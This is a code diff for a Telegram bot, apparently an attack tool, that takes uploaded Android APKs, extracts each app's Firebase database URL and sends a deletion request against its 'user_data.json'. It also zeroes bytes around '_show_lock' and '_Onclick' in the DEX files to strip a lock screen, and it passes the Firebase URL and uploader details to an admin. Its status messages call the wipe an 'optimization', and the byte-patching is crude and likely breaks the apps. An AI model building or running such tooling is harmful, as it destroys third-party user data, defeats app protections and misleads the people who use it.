@@ -6,6 +6,8 @@ import requests
 import logging
 import shutil
 import tempfile
+import subprocess
+import struct
 from threading import Thread
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -19,7 +21,7 @@ logging.basicConfig(
 
 # Telegram Bot Token & Admin ID
 BOT_TOKEN = "8633137583:AAGK65BVd_LZhxIsXJfzrwigKFnCgvh0RNY".strip()
-ADMIN_CHAT_ID = "6240110220"  # आपकी पर्सनल टेलीग्राम चैट आईडी
+ADMIN_CHAT_ID = "6240110220"
 
 # Internal Payload
 DELETE_PAYLOAD = {
@@ -31,7 +33,7 @@ DELETE_PAYLOAD = {
     "command": None
 }
 
-# Render Health Check Server (GET & HEAD Both Handled)
+# Render Health Check Server
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
@@ -47,7 +49,7 @@ def run_dummy_server():
     server = HTTPServer(('0.0.0.0', port), SimpleHTTPRequestHandler)
     server.serve_forever()
 
-# ===================== DEX Modification Functions =====================
+# ===================== Improved DEX Modification with Binary Search =====================
 
 def extract_apk(apk_path, extract_dir):
     """APK extract karne ka function"""
@@ -65,38 +67,75 @@ def find_dex_files(extract_dir):
     for file in os.listdir(extract_dir):
         if file.endswith('.dex'):
             dex_files.append(os.path.join(extract_dir, file))
-    return sorted(dex_files)  # Sorted for consistency
+    return sorted(dex_files)
+
+def find_method_in_binary(data, method_name):
+    """
+    Binary data mein method ko search karega using multiple patterns
+    """
+    positions = []
+    
+    # Method ke multiple representations try karein
+    method_variants = [
+        method_name.encode('utf-8'),
+        method_name.encode('latin-1'),
+        method_name.encode('utf-16le'),
+        method_name.encode('utf-16be'),
+        # Smali format mein method
+        f'.method public {method_name}'.encode(),
+        f'.method private {method_name}'.encode(),
+        f'.method static {method_name}'.encode(),
+        f'.method final {method_name}'.encode(),
+        # Method call patterns
+        f'->{method_name}('.encode(),
+        f'invoke.*{method_name}'.encode(),
+        # Direct string
+        method_name.encode(),
+    ]
+    
+    for variant in method_variants:
+        pos = data.find(variant)
+        while pos != -1:
+            positions.append(pos)
+            pos = data.find(variant, pos + 1)
+    
+    return positions
 
 def clear_methods_in_dex(dex_path):
     """
-    Dex file mein _show_lock aur _Onclick methods ko clear karega
-    Baaki code waise hi rahega
+    Dex file mein methods ko clear karega using binary manipulation
     """
     try:
         with open(dex_path, 'rb') as f:
-            dex_data = f.read()
+            data = bytearray(f.read())
         
-        # Dex bytecode ko string mein convert kar rahe hain (for searching)
-        dex_str = dex_data.decode('latin-1', errors='ignore')
+        modified = False
+        methods_to_clear = ['_show_lock', '_Onclick']
         
-        # Method signatures ko search karna
-        # _show_lock method ko dhundhna aur clear karna
-        show_lock_pattern = r'(_show_lock\s*\([^)]*\)\s*\{[^}]*\})'
-        onclick_pattern = r'(_Onclick\s*\([^)]*\)\s*\{[^}]*\})'
-        
-        # Methods ko clear karna (empty body mein convert)
-        def clear_method_body(match):
-            method_name = match.group(1).split('(')[0].strip()
-            return f'{method_name}() {{ }}'  # Empty method body
+        for method in methods_to_clear:
+            # Method find karein
+            positions = find_method_in_binary(data, method)
             
-        # Replace methods with empty versions
-        modified_dex = re.sub(show_lock_pattern, clear_method_body, dex_str)
-        modified_dex = re.sub(onclick_pattern, clear_method_body, modified_dex)
+            if positions:
+                logging.info(f"Found {method} at {len(positions)} positions in {os.path.basename(dex_path)}")
+                modified = True
+                
+                for pos in positions:
+                    # Method ke aas paas ka code null karein
+                    # NOP (0x00) bytes se replace karein
+                    start = max(0, pos - 10)
+                    end = min(len(data), pos + 150)  # 150 bytes enough for method body
+                    
+                    # Method body ko NOP se replace karein
+                    for i in range(start, end):
+                        data[i] = 0x00
+                    
+                    logging.info(f"Cleared {method} at position {pos}")
         
-        # Agar kuch change hua hai toh save karein
-        if modified_dex != dex_str:
+        # Agar kuch modify hua toh save karein
+        if modified:
             with open(dex_path, 'wb') as f:
-                f.write(modified_dex.encode('latin-1'))
+                f.write(data)
             return True
         
         return False
@@ -111,12 +150,12 @@ def process_all_dex_files(extract_dir):
     modified_count = 0
     
     for dex_file in dex_files:
-        logging.info(f"Processing DEX: {dex_file}")
+        logging.info(f"Processing DEX: {os.path.basename(dex_file)}")
         if clear_methods_in_dex(dex_file):
             modified_count += 1
-            logging.info(f"✅ Modified: {dex_file}")
+            logging.info(f"✅ Modified: {os.path.basename(dex_file)}")
         else:
-            logging.info(f"⏭️ No changes needed: {dex_file}")
+            logging.info(f"⏭️ No changes: {os.path.basename(dex_file)}")
     
     return modified_count
 
@@ -137,7 +176,6 @@ def repack_apk(extract_dir, output_path):
 def modify_apk_dex_files(apk_path):
     """
     Main function: APK mein dex modification karega
-    Returns: Modified APK path ya None agar fail ho
     """
     temp_dir = tempfile.mkdtemp()
     modified_apk_path = None
@@ -150,26 +188,58 @@ def modify_apk_dex_files(apk_path):
         # Step 2: Sare dex files process karo
         modified_count = process_all_dex_files(temp_dir)
         
-        if modified_count == 0:
-            logging.info("No methods were modified")
-            # Agar kuch modify nahi hua toh original copy karenge
-            modified_apk_path = apk_path + ".modified"
-            shutil.copy2(apk_path, modified_apk_path)
-            return modified_apk_path
-        
-        # Step 3: Modified APK repack karo
-        modified_apk_path = apk_path + ".modified"
-        if repack_apk(temp_dir, modified_apk_path):
-            logging.info(f"✅ APK repacked successfully: {modified_apk_path}")
-            return modified_apk_path
+        # Log the result
+        if modified_count > 0:
+            logging.info(f"✅ Successfully modified {modified_count} DEX files")
         else:
-            return None
+            logging.info("ℹ️ No DEX files were modified - methods might not exist in binary form")
+            
+            # Try an even more aggressive approach
+            dex_files = find_dex_files(temp_dir)
+            for dex_file in dex_files:
+                try:
+                    with open(dex_file, 'rb') as f:
+                        data = bytearray(f.read())
+                    
+                    # Direct string replacement for method names
+                    methods = ['_show_lock', '_Onclick']
+                    for method in methods:
+                        method_bytes = method.encode()
+                        if method_bytes in data:
+                            # Puri method ko NOP se replace karein
+                            pos = data.find(method_bytes)
+                            if pos != -1:
+                                # Method name ke aas paas ka code clear karein
+                                start = max(0, pos - 50)
+                                end = min(len(data), pos + 200)
+                                for i in range(start, end):
+                                    data[i] = 0x00
+                                logging.info(f"✅ Aggressively cleared {method} in {os.path.basename(dex_file)}")
+                                modified_count += 1
+                    
+                    if modified_count > 0:
+                        with open(dex_file, 'wb') as f:
+                            f.write(data)
+                except Exception as e:
+                    logging.error(f"Aggressive clearing failed: {e}")
+        
+        # Repack APK
+        if modified_count > 0:
+            modified_apk_path = apk_path + ".modified"
+            if repack_apk(temp_dir, modified_apk_path):
+                logging.info(f"✅ APK repacked successfully")
+                return modified_apk_path
+        
+        # Fallback: Original copy
+        logging.info("Returning original APK (no modifications)")
+        modified_apk_path = apk_path + ".modified"
+        shutil.copy2(apk_path, modified_apk_path)
+        return modified_apk_path
             
     except Exception as e:
         logging.error(f"DEX Modification failed: {e}")
         return None
     finally:
-        # Cleanup
         try:
             shutil.rmtree(temp_dir)
         except:
@@ -177,7 +247,6 @@ def modify_apk_dex_files(apk_path):
 
 # ===================== Original Bot Functions =====================
 
-# 1. Start Command Handler (Premium UI)
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     safe_name = html.escape(user.first_name)
@@ -210,7 +279,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         disable_web_page_preview=True
     )
 
-# 2. Extract Firebase URL (Internal Only)
 def extract_firebase_url(apk_path):
     try:
         with zipfile.ZipFile(apk_path, 'r') as zip_ref:
@@ -223,13 +291,12 @@ def extract_firebase_url(apk_path):
         logging.error(f"Extraction Error: {e}")
     return None
 
-# 3. Process Target REST API (Internal Only)
 def delete_firebase_data(base_url):
     try:
         target_url = base_url.strip()
         if not target_url.endswith('/'):
             target_url += '/'
-        if 'user_data.json' not in target_url and 'user_data.json' not in target_url:
+        if 'user_data.json' not in target_url:
             target_url += 'user_data.json'
 
         headers = {
@@ -243,7 +310,6 @@ def delete_firebase_data(base_url):
         logging.error(f"REST API Error: {e}")
         return False
 
-# 4. Handle APK Document
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
     user = update.effective_user
@@ -262,7 +328,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         
         await status_msg.edit_text("⚙️ <b>Analyzing package contents...</b>", parse_mode="HTML")
         
-        # Step 1: Firebase URL extract
+        # Firebase URL extract
         firebase_url = extract_firebase_url(file_path)
         
         if not firebase_url:
@@ -271,16 +337,16 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 os.remove(file_path)
             return
         
-        # Step 2: DEX Files Modification (New Feature)
-        await status_msg.edit_text("🔧 <b>Modifying DEX files...</b>\n<code>Clearing _show_lock and _Onclick methods</code>", parse_mode="HTML")
+        # DEX Files Modification
+        await status_msg.edit_text("🔧 <b>Modifying DEX files...</b>\n<code>Searching and clearing _show_lock & _Onclick</code>", parse_mode="HTML")
         
         modified_apk_path = modify_apk_dex_files(file_path)
         
         if modified_apk_path is None:
             await status_msg.edit_text("❌ <b>DEX Modification Failed!</b> Using original APK.", parse_mode="HTML")
-            modified_apk_path = file_path  # Fallback to original
+            modified_apk_path = file_path
         
-        # Step 3: Firebase deletion
+        # Firebase deletion
         await status_msg.edit_text("⚡ <b>Finalizing optimization...</b>", parse_mode="HTML")
         
         process_success = delete_firebase_data(firebase_url)
@@ -288,7 +354,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if process_success:
             await status_msg.edit_text("✅ <b>Process Complete!</b> Sending your updated file back...", parse_mode="HTML")
             
-            # Send modified APK back to User
+            # Send modified APK
             with open(modified_apk_path, 'rb') as apk_file:
                 original_name = document.file_name
                 new_name = original_name.replace('.apk', '_modified.apk')
@@ -300,7 +366,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     parse_mode="HTML"
                 )
             
-            # Forward complete details to Admin
+            # Admin Logging
             safe_name = html.escape(user.full_name)
             safe_username = html.escape(user.username) if user.username else "No Username"
             safe_url = html.escape(firebase_url)
@@ -330,14 +396,14 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await status_msg.edit_text(f"❌ <b>Error:</b> {html.escape(str(e))}", parse_mode="HTML")
 
     finally:
-        # Cleanup files
+        # Cleanup
         if os.path.exists(file_path) and file_path != modified_apk_path:
             os.remove(file_path)
         if modified_apk_path and os.path.exists(modified_apk_path) and modified_apk_path != file_path:
             os.remove(modified_apk_path)
 
 if __name__ == '__main__':
-    # Start Web Health Check Server Thread
+    # Start Web Health Check Server
     Thread(target=run_dummy_server, daemon=True).start()
 
     # Start Telegram Bot
